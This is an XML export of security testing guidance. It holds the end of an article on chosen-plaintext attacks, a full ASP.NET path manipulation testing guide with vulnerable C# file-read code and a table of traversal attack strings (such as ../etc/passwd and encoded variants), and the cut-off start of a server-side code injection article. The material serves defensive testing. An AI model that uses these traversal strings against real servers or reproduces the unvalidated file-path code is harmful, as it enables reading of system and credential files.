 the victim to encrypt the new plaintext blocks; and finally, the attacker reads the ciphertext produced by their chosen plaintext blocks.&amp;nbsp;A common use of this attack is to steal sensitive information like passwords or credit card numbers.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;For instance, the attacker starts monitoring encrypted network traffic between a client and server. After some analysis, the attacker realizes that the client password is sent at a specific offset of a packet (&lt;em&gt;C&lt;/em&gt;). The attacker wants to know if the
 plaintext &lt;em&gt;P&lt;/em&gt; that produced the encrypted password (&lt;em&gt;C&lt;/em&gt;) is equivalent to another chosen plaintext
&lt;em&gt;P';&lt;/em&gt;&lt;em&gt;.&lt;/em&gt; If the system suffers from a chosen plaintext vulnerability, the attacker creates different plaintexts
&lt;em&gt;Pk';&lt;/em&gt; and forces the victim to use them in its following transmissions (which the attacker will also sniff).&amp;nbsp; For each plaintext&lt;em&gt;Pk';&lt;/em&gt; the attacker checks if the ciphertext
&lt;em&gt;Ck';&lt;/em&gt; is &lt;em&gt;equivalent&lt;/em&gt; to &lt;em&gt;C.&amp;nbsp;&lt;/em&gt;If they are equivalent the chosen plaintext
&lt;em&gt;Pk'; &lt;/em&gt;is equal to the client's password:&amp;nbsp;&amp;nbsp; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;C = E(K, P)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Ck'; = E(K, Pk';)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If &lt;em&gt;Ck'; &lt;/em&gt;&lt;em&gt;˜&lt;/em&gt;&lt;em&gt; C &lt;/em&gt;then &lt;em&gt;Pk';= P.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If the attack is successful, the attacker controls &lt;em&gt;Pk';&lt;/em&gt; and can read both
&lt;em&gt;C&lt;/em&gt; and &lt;em&gt;Ck';. &lt;/em&gt;The only unknown values above are the encryption key (&lt;em&gt;K&lt;/em&gt;)and the client's password (&lt;em&gt;P&lt;/em&gt;).&lt;em&gt;&amp;nbsp;&amp;nbsp;&lt;/em&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Encryption systems require &lt;em&gt;block cipher modes&lt;/em&gt; to allow for encryption of more than one cipher block.&amp;nbsp;We say that a ciphertext in
&lt;em&gt;Ck'; &lt;/em&gt;must be to &lt;em&gt;equivalent&lt;/em&gt; to&lt;em&gt;C &lt;/em&gt;because &lt;em&gt;Ck'; &lt;/em&gt;lives in a separate block (sent later) so it undergoes the cipher mode modification.&amp;nbsp; Nonetheless, if the attacker deduces this equivalence, they can verify if any of the predicted
 passwords in &lt;em&gt;Pk';&lt;/em&gt; are valid.&amp;nbsp;A system that uses insecure cipher modes (such as ECB) or is poorly implemented (i.e. using a predictable initialization vector or
&lt;em&gt;IV&lt;/em&gt;) exposes itself to this variant [i] of attack.&amp;nbsp; &lt;/p&gt;
&lt;h1&gt;Step 2:&amp;nbsp; Analyze Root Cause and Mitigations&lt;/h1&gt;
&lt;p&gt;The next step is to analyze what causes chosen plaintext vulnerabilities and how to prevent them.&amp;nbsp; Knowing the root cause of security vulnerabilities helps you to identify them in both design and implementation (source code).&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;h2&gt;Root Causes&lt;/h2&gt;
&lt;p&gt;Any design, implementation, configuration, or deployment condition that leads to an
&lt;em&gt;attacker controlling the plaintext&lt;/em&gt; &lt;em&gt;that the victim encrypts &lt;/em&gt;is a root cause of a chosen plaintext bug.&lt;/p&gt;
&lt;p&gt;However, it is difficult to pinpoint the actual root causes for this vulnerability.&amp;nbsp; Picture a cryptography scenario wherein Alice sends Bob an encrypted message.&amp;nbsp; Alice encrypts a message on her computer before sending it to Bob.&amp;nbsp; An eavesdropper monitoring
 the encrypted communication is unable to change any of the plaintext; as the plaintext exists only on Alice's computer prior to encryption and transmission.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;To execute a chosen plaintext attack, the adversary needs to somehow infiltrate the victim's machine, or remotely force the victim to select the plaintext of their choice.&amp;nbsp; Any situation that allows a victim to encrypt the adversary's plaintext is a root
 cause of this vulnerability.&amp;nbsp; The challenge here is that these circumstances might fall outside of the encryption system's responsibility.&amp;nbsp; For example, the adversary might install a Trojan horse on Alice's computer which is then later used to replace any
 of Alice's plaintext before it is encrypted.&amp;nbsp; If the plaintext is replaced with that of the adversary's choice, the resulting ciphertext is that of the chosen plaintext after encryption.&amp;nbsp; The root cause here is that the victim previously allowed the attacker
 to install a trojan horse program, rather than a flaw in the encryption system itself.&lt;/p&gt;
&lt;h2&gt;Mitigations&lt;/h2&gt;
&lt;p&gt;Although there are multiple mitigations against this attack; none offer a complete solution.&amp;nbsp; In order to exploit this vulnerability, the adversary must choose from different attack avenues such as installing spyware, remotely corrupting the victim's file
 system, or otherwise forcing the victim to append the attacker's plaintext as part of an encrypted message.&amp;nbsp; Thus, possible mitigations include running up to date malware protection, hardening the operating system, and not including anonymous text in encrypted
 messages.&amp;nbsp; This emphasizes that there are many mitigations to aid in preventing this attack, and a defense in depth approach must be taken to minimize the overall risk.&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you';ve learned about chosen plaintext attack scenarios, what causes them, and how to prevent them, you must test for secure and insecure implementations.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Testing against an offline chosen plaintext attack&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Select a victim. &lt;/li&gt;&lt;li&gt;Produce block(s) of plaintext that you wish to see enciphered. &lt;/li&gt;&lt;li&gt;Force the victim to encrypt the block(s) of plaintext produced in step 2. &lt;/li&gt;&lt;li&gt;Collect the resulting ciphertext for your chosen plaintext.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected Result:&amp;nbsp; The test succeeds if you can';t get the victim to encipher the produced plaintext block(s) (step 3).&amp;nbsp; It fails if you are able to execute steps 3 and 4.&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;Testing against an online chosen plaintext attack&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Select a victim client. &lt;/li&gt;&lt;li&gt;Select a victim server. &lt;/li&gt;&lt;li&gt;Start sniffing network traffic between the client and server. &lt;/li&gt;&lt;li&gt;Read a number of messages between the server and the client. &lt;/li&gt;&lt;li&gt;Using information in the messages read, produce the plaintext you wish to force the server or the client to encrypt and send.
&lt;/li&gt;&lt;li&gt;Force the victim server/client to encrypt the chosen plaintext from step 5. &lt;/li&gt;&lt;li&gt;Keep sniffing the network traffic until you see the resulting cipher text for the chosen plaintext in step 5.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected Result:&amp;nbsp; The test succeeds if you can';t get the server to encipher the chosen plaintext (step 6).&amp;nbsp; It fails if you are able to execute steps 6 and 7.&lt;/p&gt;
&lt;p&gt;These two high level cases show the basic details on how to test against a chosen plaintext attack.&amp;nbsp; Make sure to cover both cases when testing your encryption system.&amp;nbsp; During this step, you must be exploring ways of validating your test cases.&amp;nbsp; You must
 find a way to verify that your chosen plaintext is actually being encrypted and to match your chosen plaintext with its encrypted equivalent.&amp;nbsp; This will most likely require you to learn the protocol used between your target clients and servers, as well as
 exploration by trial and error.&lt;/p&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Tune Test Cases&lt;/h1&gt;
&lt;p&gt;Now that you';ve gone over the basic tests against chosen plaintext bugs, you must revise additional testing details and implications depending on the system under attack.&lt;/p&gt;
&lt;h3&gt;Attack Avenues&lt;/h3&gt;
&lt;p&gt;Chosen plaintext attacks have a fundamental requirement: &lt;em&gt;the adversary needs to trick the victim into encrypting his chosen plaintext.&amp;nbsp;
&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A good example of applied chosen-plaintext testing attack avenues were presented along with an SSL chosen-plaintext vulnerability. &amp;nbsp;You';ve also seen some examples above.&amp;nbsp; This list presents a good set of attack avenues that you need to try:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Installing spyware or Trojan horse in the victim's system that modifies the chosen plaintext before it is encrypted by the victim.
&lt;/li&gt;&lt;li&gt;Sending the chosen plaintext to the target in an attempt that the victim encrypts it in a reply.
&lt;/li&gt;&lt;li&gt;Storing the chosen plaintext in a data store that will be later encrypted by the victim.
&lt;/li&gt;&lt;li&gt;Sending the chosen plaintext as part of a plug-in installation. &lt;/li&gt;&lt;li&gt;Hijacking an encryption API and executing the encryption function from the tester's console, with the chosen plaintext, but in the victim's context (impersonating the victim).
&lt;/li&gt;&lt;li&gt;Executing arbitrary code in the victim's context that calls the encryption procedure from that victim's context.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;As you can see, there are many routes to test for chosen plaintext bugs; and additional exploits appear frequently in the Internet.&amp;nbsp; It is important that you cover these routes and keep up with the latest attack avenues and techniques when testing against
 this class of bug.&lt;/p&gt;
&lt;br&gt;
&lt;h3&gt;Attack Methods&lt;/h3&gt;
&lt;p&gt;As seen, it is possible to execute two different attack methods by exploiting chosen plaintext bugs:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Breaking Encryption&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first method seen is that of recovering the encryption key of the encryption algorithm in use.&amp;nbsp; In general cryptography, the encryption and decryption routines are publically known since they should not be broken in a feasible time period with a strong
 key length.&amp;nbsp; However, sometimes cryptosystems utilize insufficiently large key sizes such as a 56-bit key paired with outdated algorithms like DES.&amp;nbsp; There are different ways to break an encryption algorithm and recover the key using appropriate cryptanalysis
 [ii]&amp;nbsp;methods, and this process can be much easier if the attacker has control of the plaintext.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Stealing Sensitive Data &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the second scenario you saw how to execute an information disclosure attack on the victim's password using a chosen plaintext bug.&amp;nbsp; When executing this payload the attacker is not trying to calculate the encryption key.&amp;nbsp; The attacker's goal is to reveal
 an unknown plaintext (The user's password.)&amp;nbsp; The attacker has access to the ciphertext produced by the unknown plaintext.&amp;nbsp; Furthermore, if a chosen plaintext bug exists, the attacker controls future plaintexts and therefore their resulting ciphertext.&amp;nbsp; The
 attacker produces plaintexts to send in to the encryption systems, in hopes that one of them will be equal to the original plaintext; the attacker then compares the produced ciphertexts with the original ciphertext to see if the plaintext has been discovered.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Ensure that you focus on testing one attack method at a time, rather than trying to test both simultaneously.&lt;/p&gt;
&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Chosen plaintext attacks are common in cryptography systems and have various potential implications.&amp;nbsp; The attacker uses this class of attack to compute the system's private encryption key, or in an attempt to discover secret plaintext such as a password
 or credit card number.&amp;nbsp; You must understand the basic attack scenarios for this class of attack, what causes them, and how to prevent them.&amp;nbsp; Then, test your application through its different attack avenues to reveal any vulnerabilities in your system.&amp;nbsp; Finish
 by tuning your test cases with the different attack methods presented here.&lt;/p&gt;
&lt;div&gt;
&lt;hr&gt;
&lt;/div&gt;
&lt;p&gt;[i] &lt;strong&gt;Vulnerability of SSL to Chosen-Plaintext Attack&lt;/strong&gt;.&lt;strong&gt;&amp;nbsp;
&lt;/strong&gt;Gregory V. Bard.&amp;nbsp; May, 2004.&amp;nbsp; &lt;a href="http://citeseer.ist.psu.edu/cache/papers/cs/30519/http:zSzzSzeprint.iacr.orgzSz2004zSz111.pdf/bard04vulnerability.pdf"&gt;
http://citeseer.ist.psu.edu/cache/papers/cs/30519/http:zSzzSzeprint.iacr.orgzSz2004zSz111.pdf/bard04vulnerability.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[ii] &lt;strong&gt;Cryptanalysis&lt;/strong&gt;. Wikipedia. &amp;nbsp;&lt;a href="http://en.wikipedia.org/wiki/Cryptanalysis"&gt;http://en.wikipedia.org/wiki/Cryptanalysis&lt;/a&gt;&lt;/p&gt;
&lt;div&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f9452ba5-cfe8-4d99-b52c-a00e1f927bbb</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Path Manipulation Bugs in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;In a path manipulation attack, an attacker submits certain input to alter an internal file path used by the application, forcing the application to use a malicious path. Attackers may exploit this bug to read sensitive files on the server such as configuration
 files or another user’s files, as well as to modify or delete server-side files.
&lt;/p&gt;
&lt;p&gt;Follow these steps to test for path manipulation bugs in ASP.NET:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1: Understand attack scenarios&lt;/li&gt;&lt;li&gt;Step 2: Analyze causes and countermeasures&lt;/li&gt;&lt;li&gt;Step 3: Start testing and exploring&lt;/li&gt;&lt;li&gt;Step 4: Execute additional testing&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 1: Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;The first step in testing for path manipulation bugs is to understand the anatomy of an attack scenario.
&lt;/p&gt;
&lt;p&gt;To exploit this vulnerability, the attacker manipulates a file path in an HTTP request. If the application is vulnerable, it uses the manipulated file path to perform a file system operation. The attack starts with the attacker discovering an HTTP request
 that invokes a server-side file system operation such as reading, modifying, deleting, emailing, or printing a file. This request comes either from a web page or from a client-side script (such as in AJAX applications) and contains a variable (URL parameter,
 web form input, etc) that the server uses to determine what file to handle. &amp;nbsp;To execute the attack, the attacker submits the request but modifies this variable in an attempt to manipulate a server-side file, exploiting an intended functionality of the application
 for malicious purposes. If the attack is successful, the value provided by the attacker causes the server to access a file in a different path. In most cases, the attacker will be able to tell if the attack is successful shortly after executing it.&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The attacker finds an HTTP request that invokes a file system operation at the server.&lt;/li&gt;&lt;li&gt;The attacker locates a variable in an HTTP request used to determine the path for a file system operation.&lt;/li&gt;&lt;li&gt;The attacker submits the request, but modifies the path determining variable and waits for a server response.&lt;/li&gt;&lt;li&gt;The attacker verifies if the attack is successful by observing the server’s response.&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;&lt;em&gt;&lt;br&gt;
Attack Variants&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Attackers can employ path manipulation attacks to achieve different threats. For example, an attacker can manipulate a path to read server configuration and password files, or to read files belonging to another user, in order to execute an information disclosure
 attack on the application. &amp;nbsp;Similarly, an attacker can manipulate a path to force the ASP.NET application into deleting a file needed to properly service its users, generating a denial of service situation.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2: Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;p&gt;Next, before executing practical test cases, it is necessary to understand why these bugs exist and how to avoid them.&lt;/p&gt;
&lt;p&gt;Path manipulation bugs affect ASP.NET applications that use input provided by clients to build a file path. For instance, the code below gets an input value from the user in an URL parameter named
&lt;em&gt;filename&lt;/em&gt;:&lt;/p&gt;
&lt;pre&gt;string filename = &amp;quot;/public/user_files/&amp;quot; &amp;#43; &lt;br&gt;Server.UrlDecode(Request.QueryString[&amp;quot;filename&amp;quot;]);&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&lt;br&gt;StreamReader streamReader = new StreamReader(filename);&lt;br&gt;while (streamReader.Peek() &amp;gt;= 0)&lt;br&gt;{&lt;br&gt;  Response.Write(streamReader.ReadLine());&lt;br&gt;}&lt;br&gt;streamReader.Close();&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;If the user provides an expected file name such as &lt;em&gt;file.txt&lt;/em&gt;, the application returns an expected user file:&lt;/p&gt;
&lt;pre&gt;http://example.com.pe/example.aspx?filename=&lt;strong&gt;file.txt&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;However, during a path manipulation scenario, an attacker provides a malicious value for the variable, hoping that the application uses it to determine a different file path:&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;http://example.com.pe/example.aspx?filename=&lt;strong&gt;../../private/secret.txt&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The above string causes the application to go up two directories, navigate to the
&lt;em&gt;private&lt;/em&gt; folder, and display &lt;em&gt;secret.txt.&lt;/em&gt; The example above is a common scenario of information disclosure due to path manipulation. Notice that the attack is possible because the code shown trusts the filename provided by the client; it starts
 by directly copying the input to the internal variable used to determine the filename, without properly validating it.&lt;/p&gt;
&lt;p&gt;To protect against this bug ASP.NET applications must properly validate user input. Specifically, they must check if the input is safe to use in determining a file path. Developers can use blacklists that contain a list of all disallowed filename constructs
 such as “../” (without the quotes) and check if the user input appears in a blacklist. The problem with blacklists is that any variant of an attack that is not accounted for will execute unnoticed; to be effective, blacklists must account for all 100% of all
 attack variants -- which is unreasonable. The recommended approach to defend against this bug is to use
&lt;em&gt;whitelists. &lt;/em&gt;Whitelists specify only safe constructs, and disallow any user input that doesn’t match any of the specified safe constructs. By doing this, they only need to specify what is good and don’t have to account for 100% of all attack variants.
&lt;/p&gt;
&lt;p&gt;A common way of implementing a whitelist is by using a regular expression to specify what is safe and to disallow all input that doesn’t match the regular expression:&lt;/p&gt;
&lt;pre&gt;Regex validFilename = new Regex(&amp;quot;^[a-zA-Z]{4,8}\.txt$&amp;quot;);&lt;br&gt;string input = Server.UrlDecode(Request.QueryString[&amp;quot;filename&amp;quot;]);&lt;br&gt;&amp;nbsp;&lt;br&gt;if (!validFilename.IsMatch(input))&lt;br&gt;{&lt;br&gt;  Response.Write(&amp;quot;invalid input&amp;quot;);&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;  string filename = &amp;quot;/public/user_files/&amp;quot; &amp;#43;&lt;br&gt;  &amp;nbsp;&amp;nbsp; Server.UrlDecode(Request.QueryString[&amp;quot;filename&amp;quot;]);&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;  StreamReader streamReader = new StreamReader(filename);&lt;br&gt;  while (streamReader.Peek() &amp;gt;= 0)&lt;br&gt;  {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;     Response.Write(streamReader.ReadLine());&lt;br&gt;  }&lt;br&gt;  streamReader.Close();&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The input must consist of four to eight consecutive upper- or lower-case letters followed by the extension
&lt;em&gt;“.txt”&lt;/em&gt;. Any input that doesn’t match this form results in the application giving an
&lt;em&gt;invalid input&lt;/em&gt; error.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3: Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you’ve learned the common attack scenarios as well as the causes and countermeasures for path manipulation bugs, it is necessary to execute basic test cases to check if your application is vulnerable.&lt;/p&gt;
&lt;p&gt;Success in testing for path manipulation bugs depends on your ability to determine the variables the application uses to build a file path. Applications commonly use URL and web form variables, so it is necessary to understand how to test through these two
 input points. &lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for path manipulation in URL variables&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps to test for path manipulation in an URL variable:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use an Internet browser to perform a file system operation. Note the URL used, such as
&lt;em&gt;http://example.com.pe/example.asp?&lt;strong&gt;page=index.html&lt;/strong&gt;&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Locate the URL variable used to by the application to determine the file name (in this case it is
&lt;em&gt;page&lt;/em&gt;).&lt;/li&gt;&lt;li&gt;Replace the value of the variable found in step 2 with an attack string (see Table 1). For instance:
&lt;em&gt;http://example.com.pe/example.asp?page&lt;strong&gt;=&lt;/strong&gt;../../../boot.ini&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Submit request to application and wait for response.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in step 3 to determine the response and the attacker-specified file is used in the
 response.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for path manipulation in web form variables&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps to test for path manipulation through web forms:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Navigate to a page containing a web form that prompts for a file name.&lt;/li&gt;&lt;li&gt;Locate the variable (input field) used by the application to determine the file name.&lt;/li&gt;&lt;li&gt;Enter an attack string in the field that indicates the filename (see Table 1). Here, it is important to disable any client-side checks that may deny entering an attack string due to illegal characters. For more information, read
&lt;em&gt;How to - Test for Client-Side Validation Bypass Bugs&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Submit the request to the application and wait for response.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results are the same as the previous test case.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Attack strings&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The following attack strings contain path manipulation characters (dots, slashes, and backslashes) and common UNIX- and Windows-related file paths in different encodings. Depending on the relative location of the web application on the server, the number
 of “../” or “..\” clauses may need to be increased or decreased in order to realize an attack:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;../etc/passwd&lt;br&gt;..\boot.ini&lt;br&gt;../boot.ini&lt;br&gt;folder_name/file_name&lt;br&gt;..\..\folder_name\file_name&lt;br&gt;../../folder_name/file_name&lt;br&gt;C:\boot.ini&lt;br&gt;%2e%2e\%2e%2e\&lt;br&gt;..%2f..%2f&lt;br&gt;%2e%2e%2f%2e%2e%2ffolder_name%2ffile_name&lt;br&gt;..%2f..%2ffolder_name%2ffile_name&lt;br&gt;..%c0%af..%c0%affolder_name..%c0%affile_name &lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;Table 1 - Path Manipulation Attack Strings&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Look for error messages that indicate file operations&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;While executing the basic test cases mentioned above, it is important to look for different type of error messages. For instance, “invalid input” or “incorrect format” error messages indicate that an application is safe, while “file not found” or HTTP 404
 errors indicate that the application may be using the attack string to find a file in a different path and may be vulnerable to this bug.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 4: Execute Additional Testing&lt;/h1&gt;
&lt;p&gt;Finally, it is important to execute additional testing for double encoding scenarios, as well as to cover all of the application’s input points.&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Cover double encoding scenarios&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Since this attack requires passing malicious input to a web application, it is necessary to add double encoding test cases for proper coverage. Double encoding consists of re-encoding the percent sign (%) in percent-encoded values with its percent-encoded
 equivalent (%25). For instance, translating the first URL into the second one:&lt;/p&gt;
&lt;pre&gt;../../&amp;nbsp; (no encoding)&lt;/pre&gt;
&lt;pre&gt;..%2f..%2f&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (single encoding)&lt;/pre&gt;
&lt;pre&gt;..%252f..%252f (double encoding)&lt;/pre&gt;
&lt;p&gt;Make sure to add a double encoded test case for every attack string you use. For more information about double encoding attacks, read
&lt;em&gt;How to - Test for Double Encoding Bugs.&lt;/em&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test through all input points&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Although path manipulation attacks commonly happen through the URL or web forms, it is important to look at additional application input points. Web applications can also take input from client cookies, web methods, extended frameworks (such as Flash/Flex),
 and third-party APIs (such as Facebook) parameters. Make sure to test for path manipulation in every place where input is taken.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Path manipulation bugs allow attackers to access a server-side file to execute attacks such as information disclosure and denial of service. They occur because applications don’t properly validate user input against a white list and allow path manipulating
 characters such as dots and slashes to be processed by the application. To test for this vulnerability you must identify the file path determining variable, commonly sent in the URL or in a web form, and replace it with an attack string while looking for an
 error message that indicates that the attack string is being used. Finally, to achieve proper test coverage of this bug, be sure to consider double encoding scenarios and to test through all of the application’s input points.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f9feb5d3-6509-4aa0-ad97-43d6ac17f697</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Server-Side Code Injection in ASP .NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
Summary&lt;/h1&gt;
&lt;p&gt;ASP .NET applications are hosted by a web server capable of interpreting and executing server-side code such as Active Server Pages (ASP files).&amp;nbsp;&amp;nbsp; A server-side code injection bug occurs when an attacker is able to inject additional server-side code that
 is then interpreted and executed as part of the application’s code; for instance, when the application dynamically evaluates data sent by its clients.&amp;nbsp; An attacker might be able to submit malicious code and have the ASP .NET application dynamically evaluate
 the injected code.&amp;nbsp; Attackers can exploit server-side code injection bugs to execute logical attacks on ASP .NET applications.&lt;/p&gt;
&lt;p&gt;Follow these steps to test for server-side code injection in ASP .NET applications:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1: Understand attack scenarios &lt;/li&gt;&lt;li&gt;Step 2: Analyze causes and countermeasures &lt;/li&gt;&lt;li&gt;Step 3: Execute test cases&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 1: Understand attack scenarios&lt;/h1&gt;
&lt;p&gt;The first step in learning how to test for server-side code injection bugs is to understand well the anatomy of a server-side code injection vulnerability in ASP .NET.&lt;/p&gt;
&lt;p&gt;It is important to understand the difference between client-side code injection and server-side code injection.&amp;nbsp; Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the client’s browser context.&amp;nbsp;
 This is why client-side code injection exploits such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim client’s browser must be able to interpret the exploit code.&amp;nbsp;&amp;nbsp;&amp;nbsp; Server-side code injection aims at having
 the application’s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application.&amp;nbsp;&amp;nbsp;&amp;nbsp; This means that an attacker that successfully exploits a server-side code injection bug will add an extra application functionality
 that executes with the same privileges of the application’s code.&amp;nbsp;&amp;nbsp; &lt;/p&gt;
&lt;p&gt;ASP .NET web applications that dynamically evaluate scripts might be vulnerable to this attack.&amp;nbsp;&amp;nbsp;&amp;nbsp; Consider an application that uses the following code:&lt;/p&gt;
